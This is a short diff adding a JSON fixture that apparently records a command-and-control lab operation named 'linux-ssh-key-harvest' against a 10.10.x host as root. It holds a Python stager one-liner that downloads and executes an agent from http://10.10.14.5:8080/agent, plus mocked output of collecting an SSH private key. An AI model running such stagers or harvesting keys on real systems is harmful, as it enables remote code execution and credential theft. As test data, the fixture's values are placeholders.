@@ -1,0 +1,22 @@
+{
+  "name": "linux-ssh-key-harvest",
+  "target": "10.10.10.51",
+  "platform": "linux",
+  "agent_id": "LIN51AGENT",
+  "agent_user": "root",
+  "listener": "lab-http-python",
+  "stager_response": {
+    "id": 202,
+    "name": "stager-py-it-lin",
+    "template": "multi_launcher",
+    "options": {
+      "Listener": "lab-http",
+      "Language": "python",
+      "Host": "10.10.14.5",
+      "Port": "8080",
+      "OutFile": ""
+    },
+    "output": "python -c \"import urllib2; exec(urllib2.urlopen('http://10.10.14.5:8080/agent').read())\""
+  },
+  "ssh_keys_output": "[*] Collected key from /home/${CANARY}/.ssh/id_rsa\n[+] Fingerprint: SHA256:abc123\n[+] Type: ssh-rsa\n[*] Done.\n"
+}
